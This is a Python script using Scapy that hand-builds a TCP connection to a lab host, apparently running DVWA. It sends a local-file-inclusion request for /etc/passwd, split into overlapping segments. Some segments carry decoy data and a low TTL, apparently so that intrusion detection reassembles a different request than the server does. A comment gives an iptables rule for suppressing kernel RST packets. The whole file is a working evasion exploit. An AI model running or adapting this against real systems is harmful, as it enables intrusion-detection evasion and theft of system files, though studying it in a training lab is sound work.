#!/usr/bin/env python
#! -*- coding: utf-8 -*-
#
# To avoid kernel sending RST packet the following iptables rule needs to be added before executing this script
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <your ip> -j DROP
 
from scapy.all import *
 
tcp_source_port=random.randrange(1025,2**16)
tcp_seq_start=random.randrange(0,2**32)
tcp_ip = IP(dst="10.0.10.101")/TCP(sport=tcp_source_port, dport=80, flags='S',
            seq=tcp_seq_start)
SYNACK = sr1(tcp_ip)
org_ttl = tcp_ip[IP].ttl

tcp_ip[TCP].ack = SYNACK[TCP].seq + 1
tcp_ip[TCP].flags = "A"
tcp_ip[TCP].window = SYNACK[TCP].window
rACK = sr1(tcp_ip, timeout=1)
 

tcp_ip[TCP].flags = "PA"
tcp_ip[TCP].seq += 36
tcp_ip[IP].ttl = 2
payload = "file"
sr1(tcp_ip/payload, timeout=1)

tcp_ip[IP].ttl = org_ttl
payload = "/etc"
sr1(tcp_ip/payload, timeout=1)

tcp_ip[IP].ttl = 2
tcp_ip[TCP].seq += len(payload)
payload = "1.phpXX"
sr1(tcp_ip/payload, timeout=1)

tcp_ip[IP].ttl = org_ttl
payload = "/passwd"
sr1(tcp_ip/payload, timeout=1)

tcp_ip[TCP].seq -= 39
payload = "GET /dvwa/vulnerabilities/fi/?page="
sr1(tcp_ip/payload, timeout=1)

tcp_ip[TCP].seq += 46
payload = " HTTP/1.1\r\nHost: 10.0.10.101\r\nAccept: */*\r\nCookie: security=low; PHPSESSID=ggasfbnet2a8ojl12huolg2do7\r\n\r\n"
RES,ERR = sr(tcp_ip/payload, multi=1, timeout=5)
tcp_ip[TCP].seq += len(payload)

gotFIN = False

for s,r in RES:
	tcp_ip[TCP].ack = r[TCP].seq+len(r[TCP].load)+1
	if r[TCP].flags & 0x1 == 1:
		gotFIN = True

tcp_ip[TCP].flags = "A"
rFIN = sr1(tcp_ip, timeout=1)

if gotFIN == False:
	if rFIN is not None:
		tcp_ip[TCP].ack = rFIN[TCP].seq+1
	tcp_ip[TCP].flags = "F"
	tcp_ip[TCP].seq += 1
	rFIN = sr1(tcp_ip, timeout=1)

if rFIN is not None:
	tcp_ip[TCP].ack = rFIN[TCP].seq+1
	tcp_ip[TCP].flags = "A"
	tcp_ip[TCP].seq += 1
	sr1(tcp_ip, timeout=1)

